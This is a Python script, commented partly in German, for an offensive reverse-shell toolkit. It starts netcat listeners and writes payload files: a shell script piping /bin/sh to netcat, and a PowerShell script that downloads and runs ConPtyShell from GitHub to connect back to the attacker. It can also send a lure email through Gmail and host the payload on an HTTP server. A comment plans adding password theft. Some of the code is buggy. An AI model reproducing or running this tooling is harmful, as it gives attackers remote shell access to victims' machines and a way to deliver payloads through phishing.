from msilib.schema import File
import os
import smtplib
from email.message import EmailMessage
import socket
import nclib

def Reversshellmenu():
    Opponentsplatform = "Linux"

    def ListenerLinux(port, ipAdress):
        try:
            order = "nc -lnvp {} -s {}".format(int(port), ipAdress)
            print("connecting ...")
            os.system(order)

        except:
            print("Error or Connection Lost")
            print("We check if there was an error and fix it if necessary")

        finally:
            print("disconnecting")
            os.system("sleep 4")

    def ListenerWindows(port, ipAdress):
        try:
            order = "stty raw -echo; (stty size; cat) | nc -lnvp {} -s {}".format(int(port), ipAdress)
            print("connecting ...")
            os.system(order)

        except:
            print("Error or Connection Lost")
            print("We check if there was an error and fix it if necessary")

        finally:
            print("disconnecting")
            os.system("sleep 4")

    def ListenerLinux2(port, ipAdress):
        # lokaler netcat-Listener für Reverse-Bash-Shell von einem entfernten Host
        server = nclib.TCPServer((ipAdress, int(port)))
        print("start Listening ...")
        for client in server:
            print('Connected to %s:%d' % client.peer)
            command = ""
            while command != "exit":
                try:
                    # wenn ein Befehl vom Benutzer eingegeben wurde
                    if len(command) > 0:
                        # die Zeile lesen, um den Befehl aus der Ausgabe auszublenden
                        if command in client.readln().decode('utf-8').strip(" "):
                            pass  # den letzten Befehl ignorieren

                    # Ausgabe bis zum Dollarzeichen erhalten (bash --posix erzwingt bash-X.X$)
                    data = client.read_until('$')
                    # Zeichenfolge der empfangenen Bytes ausgeben
                    print(data.decode('utf-8'), end="")

                    # Benutzereingabebefehl erhalten und Befehl in Socket schreiben
                    command = input(">>> ")
                    client.writeln(command)

                except KeyboardInterrupt:
                    print("\nKeyboardInterrupt")
                    exit(1)
                except Exception as e:
                    print("\nException Occurred\n")
                    print(e)
                    exit(1)

    # Funktion von Stealing Passwords als eingabe in die Powershell/CMD einbauen bei Linux > Windows !!!!!!!!!!!!!!!!!!!!!!!!!!
    print("""

-------------------------------------------------------------------------------------------------------
,------.                                                          ,---.   ,--.              ,--. ,--.
|  .--. '  ,---.  ,--.  ,--.  ,---.  ,--.--.  ,---.   ,---.      '   .-'  |  ,---.   ,---.  |  | |  |
|  '--'.' | .-. :  \  `'  /  | .-. : |  .--' (  .-'  | .-. :     `.  `-.  |  .-.  | | .-. : |  | |  |
|  |\  \  \   --.   \    /   \   --. |  |    .-'  `) \   --.     .-'    | |  | |  | \   --. |  | |  |
`--' '--'  `----'    `--'     `----' `--'    `----'   `----'     `-----'  `--' `--'  `----' `--' `--'
-------------------------------------------------------------------------------------------------------
(1)Choose Opponent's platform type ( Choosen Opponent's platform %s )
(2)Start Listening
(3)Choose Type of attack for getting a Acess
(00)Exit
-------------------------------------------------------------------------------------------------------
        """ % (Opponentsplatform))
    print("\nEnter your choise here >>> ")
    v = (input(""))
    if v == "1":
        print("Choose your Platform Linux/Windows >>> ")
        platform = int(input(""))
        if platform == "Linux":
            Opponentsplatform = "Linux"
        if platform == "linux":
            Opponentsplatform = "Linux"
        if platform == "Windows":
            Opponentsplatform = "Windows"
        if platform == "windows":
            Opponentsplatform = "Windows"

    elif v == "2":
        print("Choose a Port >>> ")
        port = int(input(""))
        print("Enter the ipAdress of the Opponentsplatform >>> ")
        ipAdress = int(input(""))
        if Opponentsplatform == "Linux":
            ListenerLinux(port, ipAdress)
        if Opponentsplatform == "Linux":
            ListenerLinux(port, ipAdress)
        if Opponentsplatform == "Windows":
            ListenerWindows(port, ipAdress)
        if Opponentsplatform == "Windows":
            ListenerWindows(port, ipAdress)

    elif v == "3":
        # Mail versenden, nen Datei erstellen, ne Powershell oder Shell datei, den Command in den Clip abspeichern oder einenfach nur Angeben
        print("""
        -------------------------------------------------------------------------------------------------------
        (1)Sending a Mail
        (2)Export a Executable file (.sh / .exe / .bat / .ps)
        (3)HTTP - Server
        (00)Exit
        -------------------------------------------------------------------------------------------------------
        """)
        print("Choose a Option >>> ")
        choiseAcess = (input(""))
        if choiseAcess == "1":
            print ("What is your Gmail-Adress >>> ")
            Gmail_login_name = (input(""))
            print ("What is your Gmail-Account-Password >>> ")
            Gmail_Password = (input(""))
            print ("Which Sender shoud used in the mail >>> ")
            Sender = (input(""))
            print ("How shoud received the mail >>> ")
            Emailadress = (input(""))
            print ("And which Subject shoud used >>> ")
            Subject = (input(""))
            #Sending a Mail with a File or a Link to a HTTP - Server
            # Erstellen Sie die Nachricht für die E-Mail
            while email_message!="exit":
                print ("""Enter your message, if you are fineshed type "exit" >>> """)
                email_message = (input(""))

            # EmailMessage-Objekt erstellen
            email = EmailMessage()
            # Von wem ist die E-Mail?
            email["from"] = Sender
            # An welche E-Mail Sie die E-Mail senden möchten
            email["to"] = Emailadress
            # Betreff der E-Mail
            email["subject"] = Subject
            email.set_content(email_message)

            # smtp-Server erstellen
            with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
                smtp.ehlo()
                # Sichere Verbindung zum Server
                smtp.starttls()
                # Melden Sie sich mit Benutzernamen und Passwort an einer Dummy-E-Mail an. Denken Sie daran, E-Mail so einzustellen, dass weniger sichere Apps zugelassen werden, wenn Sie Gmail verwenden.
                smtp.login(Gmail_login_name, Gmail_Password)
                # E-Mail senden.
                smtp.send_message(email)
            Reversshellmenu()

            
        elif choiseAcess == "2":
            print("""
            -------------------------------------------------------------------------------------------------------
            (1)Shell Scirpt (.sh)
            (2)Powershell Scirpt (.ps)
            (00)Exit
            -------------------------------------------------------------------------------------------------------
            """)
            print("Choose a Option >>> ")
            t = (input(""))
            if t=="1":
                print ("Which Port shoud used >>> ")
                PORT = int(input(""))
                print ("Which IPADRESS has the Listener shoud used >>> ")
                IPADRESS = (input(""))
                print ("Which Name has the excutable file >>> ")
                Filename = (input(""))
                content = (f"/bin/sh | nc {IPADRESS} {PORT}")
                myfile = (f"{Filename}.sh")
                with open(myfile, "w") as f:
                    f.write(content)
                Reversshellmenu()

            if t=="2":
                print ("Which Port shoud used >>> ")
                PORT = int(input(""))
                print ("Which IPADRESS has the Listener shoud used >>> ")
                IPADRESS = (input(""))
                print ("Which Name has the excutable file >>> ")
                Filename = (input(""))
                content = (f"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {IPADRESS} {PORT}")
                myfile = (f"{Filename}.ps1")
                with open(myfile, "w") as f:
                    f.write(content)
                Reversshellmenu()

        elif choiseAcess == "3":
            print ("Which Port shoud used >>> ")
            PORT = int(input(""))
            print ("Where is the excutable file located? Enter Path >>> ")
            Directory = (input(""))
            print ("Which Name has the excutable file >>> ")
            Filename = (input(""))
            hostname = socket.gethostname()
            IPADRESS = socket.gethostbyname(hostname)
            try:
                Filename = Filename.replace(" ", "%20")
                print("Press CTR + C to End the Server")
                print(f"Link for Download: http://{IPADRESS}:{PORT}/{Filename}")
                os.chdir(Directory)
                os.system(f"python -m http.server --bind {IPADRESS} {PORT}")
                print("serving at port %s \n" % (PORT))
            except:
                print ("Error, maybe because you End the Server")
                os.system("sleep 2")
                print ("Try again")
            finally:
                print ("OK, you pressed CTR + C")

            Reversshellmenu()
    else:
        print("Not Found")
        os.system("sleep 2")
        Reversshellmenu()
